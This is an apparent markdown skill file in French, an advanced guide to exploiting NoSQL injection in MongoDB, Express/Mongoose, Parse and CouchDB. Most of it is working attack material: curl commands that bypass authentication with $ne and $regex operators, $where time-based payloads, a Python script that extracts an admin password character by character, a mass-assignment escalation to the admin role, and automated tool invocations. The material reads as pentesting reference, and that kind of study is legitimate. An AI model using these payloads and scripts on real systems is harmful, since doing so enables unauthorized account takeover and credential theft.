---
name: nosql-injection
description: Guide complet d'attaques NoSQL Injection — MongoDB, CouchDB, injection JSON/opérateurs, blind NoSQL, payloads et outils
---

# NoSQL Injection — Guide d'Exploitation Avancé

## Références principales
- **PayloadsAllTheThings** : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
- **HackTricks** : https://hacktricks.wiki/en/pentesting-web/nosql-injection/
- **PortSwigger** : https://portswigger.net/web-security/nosql-injection

---

## Concepts fondamentaux

Contrairement au SQL, NoSQL utilise des opérateurs de requête au lieu de syntaxe SQL. Les injections exploitent l'interprétation d'opérateurs comme `$ne`, `$regex`, `$gt`, `$where` dans MongoDB, ou l'injection dans des requêtes JSON.

### Mots-clés MongoDB critiques

| Opérateur | Rôle | Exemple |
|-----------|------|---------|
| `$ne` | Not equal | `{"password": {"$ne": ""}}` |
| `$regex` | Regex matching | `{"email": {"$regex": "^admin"}}` |
| `$gt` | Greater than | `{"age": {"$gt": 18}}` |
| `$where` | JavaScript expression | `{"$where": "this.password.slice(0,1)=='a'"}` |
| `$nin` | Not in | `{"role": {"$nin": ["user"]}}` |

---

## Vecteurs d'attaque

### 1. Injection JSON via Content-Type: application/json

```bash
# Connexion contournée
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": ""}}'

# Authentification admin sans connaître le mot de passe
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
```

### 2. Injection par paramètres URL

Quand les paramètres sont transformés en objets par le framework (Express.js, MongoDB `$where`).

```bash
# /api/login?username=admin&password[$ne]=
curl "https://target.com/api/login?username=admin&password[\$ne]="

# /api/users?search[$regex]=.*&search[$options]=i
curl "https://target.com/api/users?search[\$regex]=.*"
```

### 3. Injection dans $where (JavaScript)

```bash
# Time-based blind
username=admin&password[$where]=sleep(5000)

# Boolean-based
username=admin&password[$where]=this.password.length==32

# Data extraction
username[$regex]=^a.*&password[$ne]=
```

---

## Blind NoSQL Injection

### Extraction de mot de passe caractère par caractère

```python
import requests
import string

url = "https://target.com/api/login"
chars = string.ascii_lowercase + string.digits
password = ""

for i in range(32):  # MD5 = 32 chars
    for c in chars:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password}{c}.*"}
        }
        r = requests.post(url, json=payload)
        if r.status_code == 200 or "success" in r.text:
            password += c
            print(f"[+] Found char {i}: {c} → {password}")
            break
```

### Time-based extraction

```bash
# Si le framework supporte $where avec sleep
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$where": "sleep(5000)"}}'
```

---

## Attaques par framework

### Express.js + MongoDB (Mongoose)

```bash
# URL parsing → object conversion
GET /api/users?search[$gt]=
GET /api/users?search[$ne]=

# Mass assignment via $set
curl -X PATCH https://target.com/api/user \
  -H "Content-Type: application/json" \
  -d '{"$set": {"role": "admin"}}'
```

### Parse.com / Rest APIs

```bash
# Injection dans les requêtes Parse
PUT /classes/User/objectId
{"isAdmin": true}
```

### CouchDB

```bash
# Injection dans les views
POST /db/_find
{"selector": {"$where": "doc.password.slice(0,1) == 'a'"}}
```

---

## Payloads avancés

### Bypass d'authentification

```json
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"$or": [{"username": "admin"}, {"password": {"$ne": ""}}]}
{"username": "admin", "password": {"$regex": ".*"}}
```

### Extraction de données

```json
// Regex brute-force du premier char
{"username": "admin", "password": {"$regex": "^a"}}

// Longueur du mot de passe
{"username": "admin", "password": {"$regex": ".{32}"}}

// Avec opérateurs de comparaison
{"age": {"$gt": "25"}}
{"registered": {"$gte": "2024-01-01"}}
```

### Opérateurs de projection

```json
// Forcer le retour de champs cachés
{"username": "admin", "password": {"$ne": ""}, "$projection": {"password": 1, "role": 1}}
```

---

## Outils

```bash
# NoSQLMap — Scanner automatique NoSQL
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
python2 nosqlmap.py

# noSQLi — Injection automatisée MongoDB
git clone https://github.com/Charlie-belmer/nosqli.git
cd nosqli
python3 nosqli.py -u "https://target.com/login" -p '{"username":"admin","password":{"$ne":""}}'
```

---

## Checklist de test

```
☐ Tester avec Content-Type: application/json + opérateurs $ne/$gt/$regex
☐ Tester injection via paramètres URL ($ne, $regex, $gt)
☐ Tester $where pour JavaScript injection
☐ Tester mass assignment via $set, $push, $inc
☐ Tester blind extraction de mot de passe (boolean + time-based)
☐ Tester regex character-by-character extraction
☐ Vérifier les champs accessibles (projection)
☐ Tester les requêtes de Parse SDK / REST frameworks
```

## Ressources

- PortSwagger NoSQL lab : https://portswigger.net/web-security/nosql-injection/lab
- MongoDB operators reference : https://www.mongodb.com/docs/manual/reference/operator/query/